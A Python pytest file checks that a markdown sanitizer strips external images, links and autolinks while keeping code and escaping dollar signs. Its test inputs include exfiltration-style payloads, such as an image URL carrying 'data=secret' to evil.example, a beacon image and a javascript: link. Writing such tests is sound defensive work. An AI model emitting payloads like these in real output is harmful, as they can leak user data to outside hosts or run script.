# Copyright (c) 2026 LindeCode S.A.S.
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at https://mozilla.org/MPL/2.0/.

from __future__ import annotations

import pytest

from interfaces.gui.safe_markdown import safe_markdown


@pytest.mark.parametrize("dangerous", [
    "![x](http://evil.example/?data=secret)",
    "![x][ref]\n\n[ref]: http://evil.example/beacon.png",
    "[pulse aquí](http://evil.example/login \"Inicio\")",
    "<http://evil.example/auto>",
    "visite https://evil.example/path?q=1 ahora",
    "[a](javascript:alert(1))",
])
def test_nothing_can_load_or_open_an_external_address(dangerous):
    rendered = safe_markdown(dangerous)
    assert "](" not in rendered.replace("`", "")      # no Markdown image or link survives
    assert "<http" not in rendered                   # no autolink
    for address in ("http://evil.example", "https://evil.example"):
        for index in range(len(rendered)):           # any address left is inside inline code
            if rendered.startswith(address, index):
                assert rendered[:index].count("`") % 2 == 1


def test_formatting_and_code_are_kept_and_dollar_signs_are_not_latex():
    text = "## Pasos\n- **Abra** PowerShell\n- Ejecute `Get-ChildItem $env:TEMP`\n\n```\n$x = 'https://keep.example'\n```\nCosto $5"
    rendered = safe_markdown(text)
    assert rendered.startswith("## Pasos\n- **Abra** PowerShell")
    assert "`Get-ChildItem $env:TEMP`" in rendered            # inline code untouched
    assert "```\n$x = 'https://keep.example'\n```" in rendered  # fenced code untouched
    assert "Costo \\$5" in rendered                           # prose dollars escaped


def test_image_placeholder_follows_the_language():
    assert safe_markdown("![logo](http://x.example/a.png)", "en") == "[image omitted: logo]"
    assert safe_markdown("![](http://x.example/a.png)") == "[imagen omitida]"
